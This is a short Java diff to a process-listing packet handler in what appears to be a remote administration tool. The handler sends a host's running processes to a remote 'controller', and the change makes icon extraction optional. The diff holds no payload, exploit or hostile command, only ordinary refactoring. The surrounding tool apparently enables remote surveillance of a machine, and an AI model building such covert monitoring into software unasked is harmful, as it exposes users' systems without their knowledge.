@@ -44,7 +44,7 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 
 				while ((line = reader.readLine()) != null) {		
 					if (line.length() > 0) {
-						con.addToSendQueue(new Packet25Process(parse(line)));
+						con.addToSendQueue(new Packet25Process(parse(line, icons)));
 					}
 				}
 				reader.close();
@@ -79,14 +79,11 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 	 * @param line
 	 * @return array to be sent back to controller
 	 */
-	public static final ProcessData parse(String line) {
+	public static final ProcessData parse(String line, boolean icon) {
 		String[] data = new String[4];
 		BufferedImage image = null;
 		
 		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
-			WindowsOperatingSystem wos = (WindowsOperatingSystem) OperatingSystem.getOperatingSystem();
-			WindowsVersion version = wos.getVersion();
-			
 			if (usePowerShell()) {
 				line = line.replaceAll("( )+", " ");
 				String[] sline = line.split(" ");
@@ -100,7 +97,7 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 					e1.printStackTrace();
 				}
 
-				if (sline.length >= 4) {
+				if (icon && sline.length >= 4) {
 					String path = "";
 					
 					for (int i = 3; i < sline.length; i++) {
